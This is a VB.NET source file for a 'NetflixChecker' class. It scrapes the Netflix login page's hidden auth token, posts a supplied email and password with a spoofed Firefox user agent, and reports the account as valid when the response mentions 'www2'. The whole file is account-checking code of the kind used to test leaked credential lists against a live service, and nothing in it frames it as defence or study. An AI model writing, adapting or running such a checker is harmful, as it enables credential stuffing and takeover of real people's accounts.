Imports System.Net
Imports System.Text
Imports System.IO
Imports System.Web
Imports System.Text.RegularExpressions

Public Class NetflixChecker

    Private Shared CC As CookieContainer

    Private Shared Function GetAuthURL() As String
        CC = New CookieContainer()
        Dim auth As String = Nothing
        Dim req As HttpWebRequest = DirectCast(HttpWebRequest.Create("https://www.netflix.com/Login"), HttpWebRequest)
        req.Method = "GET"
        req.CookieContainer = CC
        req.ProtocolVersion = HttpVersion.Version11
        req.UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0"
        req.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        req.Referer = "https://www.netflix.com/Login"
        req.KeepAlive = True

        Dim resp As HttpWebResponse = DirectCast(req.GetResponse(), HttpWebResponse)
        Dim data As Stream = resp.GetResponseStream()
        Dim sr As New StreamReader(data)
        For Each m As Match In Regex.Matches(sr.ReadToEnd(), "<input type=""hidden"" name=""authURL"" value=""(.*?)""/>")
            auth = m.Groups(1).Value
        Next

        Return WebUtility.UrlEncode(auth)
    End Function

    Private Shared Function Post(auth As String, email As String, pass As String) As Boolean
        Dim dataToPost As String = String.Format("authURL={0}&email={1}&password={2}&RememberMe=on", auth, email, pass)

        Dim req As HttpWebRequest = DirectCast(HttpWebRequest.Create("https://www.netflix.com/Login"), HttpWebRequest)
        req.Method = "POST"
        req.CookieContainer = CC
        req.ProtocolVersion = HttpVersion.Version11
        req.UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0"
        req.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        req.Referer = "https://www.netflix.com/Login"
        req.KeepAlive = True
        req.ContentType = "application/x-www-form-urlencoded"

        Dim niza As Byte() = Encoding.ASCII.GetBytes(dataToPost)
        req.ContentLength = niza.Length
        Dim data As Stream = req.GetRequestStream()
        data.Write(niza, 0, niza.Length)
        data.Flush()
        data.Close()

        Dim postResp As HttpWebResponse = DirectCast(req.GetResponse(), HttpWebResponse)
        Dim dataStream As Stream = postResp.GetResponseStream()
        Dim postReader As New StreamReader(dataStream)
        Dim str As String = postReader.ReadToEnd()
        If Not str.ToLowerInvariant().Contains("www2") Then
            Return False
        Else
            Return True
        End If

    End Function

    Function AccountValid(username As String, password As String) As Boolean
        Return Post(GetAuthURL(), WebUtility.UrlEncode(username), WebUtility.UrlEncode(password))
    End Function
End Class